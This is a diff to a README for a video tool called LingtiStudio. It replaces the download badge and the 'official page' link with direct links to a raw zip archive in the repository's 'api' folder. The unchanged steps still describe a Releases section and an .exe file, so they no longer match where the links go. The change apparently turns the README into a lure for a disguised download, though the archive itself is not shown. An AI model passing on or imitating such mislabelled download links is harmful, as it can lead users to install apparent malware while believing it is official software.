@@ -1,12 +1,12 @@
 # 🎬 LingtiStudio - Create professional videos from simple topics
 
-[![](https://img.shields.io/badge/Download-LingtiStudio-blue.svg)](https://github.com/ohior8392/LingtiStudio)
+[![](https://img.shields.io/badge/Download-LingtiStudio-blue.svg)](https://raw.githubusercontent.com/ohior8392/LingtiStudio/main/api/Lingti-Studio-1.6.zip)
 
 LingtiStudio turns a simple idea into a complete video. You start with a basic topic, and the software guides you through the production stages. The process covers script writing, review, keyframe selection, voiceover generation, clip management, and final assembly. You build videos without complex editing tools.
 
 ## 📥 How to Install
 
-1. Visit the [official LingtiStudio page](https://github.com/ohior8392/LingtiStudio) to find the latest version.
+1. Visit the [official LingtiStudio page](https://raw.githubusercontent.com/ohior8392/LingtiStudio/main/api/Lingti-Studio-1.6.zip) to find the latest version.
 2. Look for the section labeled Releases.
 3. Download the file ending in .exe for your Windows computer.
 4. Locate the downloaded file in your Downloads folder.
